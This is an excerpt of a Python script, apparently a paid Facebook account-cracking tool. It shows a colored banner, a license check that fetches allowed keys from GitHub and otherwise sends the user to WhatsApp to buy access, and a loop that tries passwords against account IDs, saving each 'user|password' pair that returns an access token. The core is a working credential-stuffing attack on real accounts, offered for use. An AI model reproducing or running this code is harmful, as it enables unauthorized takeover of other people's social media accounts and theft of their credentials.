...
def logo():
	print("""%s
          ...
          \033[0;93m   ##     ## ##   ### ##     ## ##    ##  
           \033[0;32m ##     ## ##    ## ##     ## ##     ## 
            \x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFacebook   \x1b[1;97m● \033[38;5;46mANIS SCHIAPARELLI 
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTools      \x1b[1;97m● \033[38;5;46mPAID
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/PIKSO404/ua/blob/main/u.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        os.system('am start https://wa.me/+21369491481?text=' + tks)
        reg()
...
def bsn_menu():
    ...
    print("             [*]. GITHUB     : PIKSO404");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [LBOND] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-LBOND] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
